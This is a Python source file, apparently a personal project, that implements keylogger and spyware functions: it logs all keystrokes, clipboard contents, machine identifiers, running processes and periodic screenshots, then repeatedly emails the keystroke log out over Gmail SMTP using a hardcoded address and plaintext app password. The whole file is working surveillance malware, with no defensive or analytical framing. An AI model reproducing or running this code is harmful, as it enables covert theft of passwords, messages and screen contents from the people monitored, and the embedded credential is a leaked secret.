'''
Created on 06-Sep-2022

@author: ishita92
'''
#import for grabbing keys
import logging
import os
from pynput.keyboard import Listener
#imports for getting pc information
import uuid
import socket
#imports for clipboard function
#from tkinter import Tk
from pandas.io.clipboard import clipboard_get
from time import sleep
#imports for screenshots
import pyautogui
import random
import time
#import for obtaining the name of applications
import psutil
#multiprocessing
import multiprocessing

import smtplib
import mimetypes
from email.message import EmailMessage
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from email.mime.text import MIMEText

def Key_Strokes(seconds):
        print("this function will grab all the keys pressed by the user..")
        #This command will save the data into a file name keylog.txt into a current directory 
        log_Directory = os.getcwd() + '/'  
        #print(os.getcwd()) # current working directory
        # creates file 
        logging.basicConfig(filename=(log_Directory + "keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

        # function in logging
        def on_press(key):
            logging.info(key)
        # when press key save the keystroke in file
        with Listener(on_press=on_press) as listener:
            listener.join()  # infinite cicle
            
                    
def PC_Information(seconds):
        print("this function will give all the details of pc..")
        ## getting the hostname by socket.gethostname() method
        hostname = socket.gethostname()
        ## getting the IP address using socket.gethostbyname() method
        ip_address = socket.gethostbyname(hostname)
        ## printing the hostname and ip_address
        #print(f"Hostname: {hostname}")
        #print(f"IP Address: {ip_address}")
        
        log_Directory = os.getcwd() + '/'  
        #print(os.getcwd()) 
        logging.basicConfig(filename=(log_Directory + "pcInfo.txt"),level=logging.DEBUG, format='%(asctime)s: %(message)s')
        
        logging.info(hex(uuid.getnode()))
        logging.info(hostname)
        logging.info(ip_address)


def Clipboard(seconds):
        print("this fuction will get the data which is being copied from web, computer..")
        text = " "
        while True:
            try:
            #for x in range(1):
                    if text != clipboard_get():
                        
                        text = clipboard_get()  
                        sleep(5)  
                        print(text)
        
                        log_Directory = os.getcwd() + '/'  
                        #print(os.getcwd())# path of current working directory
                        # create file 
                        logging.basicConfig(filename=(log_Directory + "clipboard.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
                        logging.info(text)
            except Exception:
                print("Failed to capture clipboard")
                    
        
                
                
def Screenshots(seconds):
        print("this function will take the screenshots of pc into particular time interval..")
        # Running the while loop for infinite time
        while True:
            # generating a random number between 20 to 30 which will represent the time delay
            random_time = random.randint(20,30)
          
            # create a time delay using the sleep() method
            time.sleep(random_time)
          
            # Take the screenshot using screenshot() method
            myScreenshot = pyautogui.screenshot()
          
            # Save the screenshot shot using current time as file name.
            file_name = str(time.time())+".png"
            myScreenshot.save(file_name)

def RunningApplications(seconds):
        print("this function will get the data of the applications running..")
        psutil.process_iter(attrs=None, ad_value=None)

        for proc in psutil.process_iter():
            try:
                # Get process name & pid from process object.
                processName = proc.name()
                processID = proc.pid
                #print(processName , ' ::: ', processID)
                log_Directory = os.getcwd() + '/'  # where save file
                #print(os.getcwd()) # directory
                # create file 
                logging.basicConfig(filename=(log_Directory + "applicationRunning.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
                logging.info(processName)
                #print("Running application")
                
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
           
         
        
def mail():
    
    while True:
            try:
                print("sending mail..")
                message = EmailMessage()
                sender = "ichristian.sweet@gmail.com"
                recipient = "ichristian.sweet@gmail.com"
                message['From'] = sender
                message['To'] = recipient
                message['Subject'] = 'Key-strokes data'
                body = """Hello
                Please find the attached kye-stroke data..!!!"""
               
               
                message.set_content(body)
                mime_type, _ = mimetypes.guess_type('newkeylog.txt')
                mime_type, mime_subtype = mime_type.split('/')
            #while True:
                #try:
                with open('/Users/ishita92/eclipse-workspace/Multiprocessingtest/keylog.txt', 'rb') as file:
                    message.add_attachment(file.read(),
                    maintype=mime_type,
                    subtype=mime_subtype,
                    filename='/Users/ishita92/eclipse-workspace/Multiprocessingtest/keylog.txt')
                    #print(message)
                    mail_server = smtplib.SMTP_SSL('smtp.gmail.com')
                    mail_server.set_debuglevel(1)
                    mail_server.login(sender, 'gjanwqtuthqgodps')
                    mail_server.send_message(message)
                    mail_server.quit()
                    time.sleep(20)
                    print("success")
            except Exception:
                print("Message failed to send")
         
    

processes = []

for x in range(1):
    p1 = multiprocessing.Process(target=Key_Strokes,args = [1])
    p2 = multiprocessing.Process(target=PC_Information,args = [1])
    p3 = multiprocessing.Process(target=Clipboard, args=[1])
    p4 = multiprocessing.Process(target=Screenshots, args=[1])
    p5 = multiprocessing.Process(target=RunningApplications, args=[1])
    p6 = multiprocessing.Process(target=mail)
    
    if __name__ == "__main__":
        p1.start()
        processes.append(p1)
        p2.start()
        processes.append(p2)
        p3.start()
        processes.append(p3)
        p4.start()
        processes.append(p4)
        p5.start()
        processes.append(p5)
        p6.start()
        processes.append(p6)
        
for p in processes:
    p1.join()
    p2.join()
    p3.join()
    p4.join()
    p5.join()
    p6.join()
    
    





